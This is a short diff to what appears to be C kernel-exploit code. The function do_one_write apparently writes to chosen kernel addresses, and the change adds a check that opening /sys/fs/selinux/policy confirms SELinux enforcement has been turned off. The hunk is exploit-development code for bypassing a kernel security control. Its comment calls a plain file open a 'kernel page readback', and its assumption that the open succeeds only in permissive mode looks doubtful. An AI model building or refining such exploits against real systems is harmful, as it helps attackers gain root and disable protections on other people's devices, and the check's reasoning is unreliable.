@@ -397,7 +397,18 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
       close(afd);
       if (nr > 0) {
         abuf[nr] = 0;
-        pr_success("  >>> WRITE VERIFIED: /proc/self/attr/current = '%s' <<<\n", abuf);
+        pr_info("  attr/current = '%s'\n", abuf);
+      }
+    }
+    /* Kernel page readback: try to open a selinux-only path that fails under
+     * enforcing but succeeds under permissive.  This is the real write test. */
+    {
+      int test_fd = open("/sys/fs/selinux/policy", O_RDONLY | O_CLOEXEC);
+      if (test_fd >= 0) {
+        close(test_fd);
+        pr_success("  >>> KERNEL PAGE READBACK: selinux/policy OPENABLE — enforcing=0 <<<\n");
+      } else {
+        pr_info("  kernel page readback: selinux/policy open failed errno=%d\n", errno);
       }
     }
   }
